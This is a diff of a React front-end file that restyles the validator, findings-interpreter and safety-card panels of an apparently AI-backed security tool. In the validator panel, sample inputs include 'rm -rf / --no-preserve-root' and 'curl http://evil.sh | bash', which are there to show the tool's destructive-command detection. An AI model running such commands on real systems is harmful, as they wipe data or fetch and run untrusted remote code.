-        <div className="p-3 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
-          <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Deep dive</div>
-          <p className="text-sm text-gray-300 whitespace-pre-wrap leading-relaxed">{r.deep_explanation}</p>
-        </div>
-      )}
+      {r?.explanation && <AICallout title="Explanation">{r.explanation}</AICallout>}
+      {r?.deep_explanation && <AICallout title="Deep dive">{r.deep_explanation}</AICallout>}
       {r?.safety && <SafetyCard safety={r.safety} />}
     </div>
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 // Panel: Validate
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 function ValidatePanel() {
   const [cmd, setCmd] = useState('');
   const mut = useAIValidateCommand();
@@ -433,27 +541,27 @@ function ValidatePanel() {
   const dangerExamples = ['rm -rf / --no-preserve-root', 'curl http://evil.sh | bash', 'nmap -sV scanme.nmap.org'];
 
   return (
-    <div className="space-y-4">
-      <textarea
+    <div className="space-y-vos-4">
+      <VosTextarea
         value={cmd}
-        onChange={e => setCmd(e.target.value)}
-        placeholder="Paste any shell command to check for destructive patterns..."
+        onChange={(e) => setCmd(e.target.value)}
+        placeholder="Paste any shell command to check for destructive patterns…"
         rows={3}
-        className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded-lg text-sm text-green-400 font-mono resize-none"
+        className="font-vos-mono text-vos-success"
       />
-      <div className="flex flex-wrap gap-2 items-center">
-        <button
+      <div className="flex flex-wrap gap-vos-2 items-center">
+        <PrimaryButton
           disabled={!cmd.trim() || mut.isPending}
           onClick={() => mut.mutate({ command: cmd.trim() })}
-          className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
+          icon={ShieldCheck}
         >
-          {mut.isPending ? 'Analyzing…' : '🛡️ Validate'}
-        </button>
-        <span className="text-xs text-gray-500">Try:</span>
-        {dangerExamples.map(ex => (
-          <button key={ex} onClick={() => setCmd(ex)} className="px-2 py-1 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded text-gray-400 font-mono">
+          {mut.isPending ? 'Analysing…' : 'Validate'}
+        </PrimaryButton>
+        <span className="text-vos-xs text-vos-text-3">Try:</span>
+        {dangerExamples.map((ex) => (
+          <ChipButton key={ex} onClick={() => setCmd(ex)}>
             {ex.length > 30 ? ex.slice(0, 28) + '…' : ex}
-          </button>
+          </ChipButton>
         ))}
       </div>
       {r && <SafetyCard safety={r} />}
@@ -461,14 +569,16 @@ function ValidatePanel() {
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 // Panel: Interpret Results
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 function InterpretPanel({ useLLM }: { useLLM: boolean }) {
   const [json, setJson] = useState('');
   const [parseErr, setParseErr] = useState('');
   const mut = useAIInterpretResults();
-  const r = mut.data as { total_findings?: number; severity_counts?: Record<string, number>; summary?: string } | undefined;
+  const r = mut.data as
+    | { total_findings?: number; severity_counts?: Record<string, number>; summary?: string }
+    | undefined;
 
   const submit = () => {
     setParseErr('');
@@ -480,86 +590,96 @@ function InterpretPanel({ useLLM }: { useLLM: boolean }) {
     }
   };
 
-  const placeholder = JSON.stringify([
-    { severity: 'high', name: 'SQL Injection', target: 'login.php' },
-    { severity: 'critical', name: 'RCE via deserialization', target: '/api/import' },
-  ], null, 2);
+  const placeholder = JSON.stringify(
+    [
+      { severity: 'high', name: 'SQL Injection', target: 'login.php' },
+      { severity: 'critical', name: 'RCE via deserialization', target: '/api/import' },
+    ],
+    null,
+    2,
+  );
 
   return (
-    <div className="space-y-4">
-      <textarea
+    <div className="space-y-vos-4">
+      <VosTextarea
         value={json}
-        onChange={e => setJson(e.target.value)}
+        onChange={(e) => setJson(e.target.value)}
         placeholder={`Paste findings JSON array, e.g.\n${placeholder}`}
         rows={10}
-        className="w-full px-3 py-2 bg-gray-950 border border-gray-700 rounded-lg text-xs text-gray-200 font-mono resize-y"
+        className="font-vos-mono text-vos-xs"
       />
-      {parseErr && <div className="text-xs text-red-400">⛔ {parseErr}</div>}
-      <button
-        disabled={!json.trim() || mut.isPending}
-        onClick={submit}
-        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
-      >
-        {mut.isPending ? 'Analyzing…' : '📊 Interpret'}
-      </button>
+      {parseErr && (
+        <div className="flex items-start gap-2 p-vos-3 rounded-vos-md bg-vos-danger/10 border border-vos-danger/30 text-vos-danger text-vos-sm">
+          <AlertOctagon size={14} className="mt-0.5 shrink-0" />
+          {parseErr}
+        </div>
+      )}
+      <PrimaryButton disabled={!json.trim() || mut.isPending} onClick={submit} icon={BarChart3}>
+        {mut.isPending ? 'Analysing…' : 'Interpret'}
+      </PrimaryButton>
 
       {r && (
-        <div className="space-y-3">
-          <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
-            <div className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg">
-              <div className="text-xs text-gray-500">Total</div>
-              <div className="text-2xl font-bold text-white">{r.total_findings ?? 0}</div>
-            </div>
-            {r.severity_counts && Object.entries(r.severity_counts).map(([sev, count]) => (
-              <div key={sev} className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg">
-                <div className="text-xs text-gray-500 capitalize">{sev}</div>
-                <div className={`text-2xl font-bold ${
-                  sev === 'critical' ? 'text-red-400' :
-                  sev === 'high' ? 'text-orange-400' :
-                  sev === 'medium' ? 'text-yellow-400' :
-                  sev === 'low' ? 'text-blue-400' : 'text-gray-400'
-                }`}>{count}</div>
-              </div>
-            ))}
-          </div>
-          {r.summary && (
-            <div className="p-4 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
-              <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Analyst Summary</div>
-              <p className="text-sm text-gray-300 whitespace-pre-wrap leading-relaxed">{r.summary}</p>
-            </div>
-          )}
+        <div className="space-y-vos-3">
+          <KeyValueGrid
+            cols={4}
+            items={[
+              { label: 'Total Findings', value: r.total_findings ?? 0 },
+              ...Object.entries(r.severity_counts ?? {}).map(([sev, count]) => ({
+                label: sev.charAt(0).toUpperCase() + sev.slice(1),
+                value: count,
+              })),
+            ]}
+          />
+          {r.summary && <AICallout title="Analyst Summary">{r.summary}</AICallout>}
         </div>
       )}
     </div>
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 // Shared: Safety card
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 function SafetyCard({ safety }: { safety: SafetyResult }) {
-  const v = VERDICT_BADGE[safety.verdict] ?? VERDICT_BADGE.review;
+  const tone = VERDICT_TONE[safety.verdict] ?? 'warning';
+  const label = VERDICT_LABEL[safety.verdict] ?? 'Review';
+  const Icon = safety.verdict === 'ok' ? Check : safety.verdict === 'review' ? AlertTriangle : AlertOctagon;
+  const borderClass =
+    tone === 'success'
+      ? 'border-vos-success/30 bg-vos-success/5'
+      : tone === 'warning'
+        ? 'border-vos-warning/30 bg-vos-warning/5'
+        : 'border-vos-danger/30 bg-vos-danger/5';
+
   return (
-    <div className={`p-3 rounded-lg border ${
-      safety.verdict === 'ok' ? 'bg-green-500/5 border-green-500/30' :
-      safety.verdict === 'review' ? 'bg-yellow-500/5 border-yellow-500/30' :
-      'bg-red-500/5 border-red-500/30'
-    }`}>
-      <div className="flex items-center gap-2 mb-2">
-        <span className={`px-2 py-0.5 text-xs rounded ${v.color} font-semibold`}>
-          {v.icon} {v.label}
-        </span>
-        {safety.warnings.length > 0 && <span className="text-xs text-gray-500">{safety.warnings.length} warning(s)</span>}
+    <div className={`p-vos-3 rounded-vos-md border ${borderClass}`}>
+      <div className="flex items-center gap-vos-2 mb-vos-2">
+        <Icon size={16} className={tone === 'success' ? 'text-vos-success' : tone === 'warning' ? 'text-vos-warning' : 'text-vos-danger'} />
+        <StatusPill tone={tone} label={label} />
+        {safety.warnings.length > 0 && (
+          <span className="text-vos-xs text-vos-text-3">{safety.warnings.length} warning{safety.warnings.length === 1 ? '' : 's'}</span>
+        )}
       </div>
       {safety.warnings.length > 0 && (
-        <ul className="space-y-1 text-xs">
+        <ul className="space-y-1.5 text-vos-xs">
           {safety.warnings.map((w, i) => (
-            <li key={i} className="flex gap-2">
-              <span className={w.severity === 'critical' ? 'text-red-400' : 'text-yellow-400'}>●</span>
-              <span className="text-gray-400"><code className="bg-gray-950 px-1 rounded">{w.pattern}</code> — {w.reason}</span>
+            <li key={i} className="flex items-start gap-2">
+              <span className={w.severity === 'critical' ? 'text-vos-danger mt-0.5' : 'text-vos-warning mt-0.5'}>●</span>
+              <span className="text-vos-text-3">
+                <code className="bg-vos-bg-elev-3 px-1.5 py-0.5 rounded-vos-sm text-vos-text-2 font-vos-mono">{w.pattern}</code>{' '}
+                — {w.reason}
+              </span>
             </li>
           ))}
         </ul>
+      )}
+      {safety.command && (
+        <div className="mt-vos-3">
+          <div className="flex items-center gap-1.5 text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">
+            <Terminal size={11} /> Command
+          </div>
+          <CodeBlock className="whitespace-pre-wrap break-words">{safety.command}</CodeBlock>
+        </div>
       )}
     </div>
   );
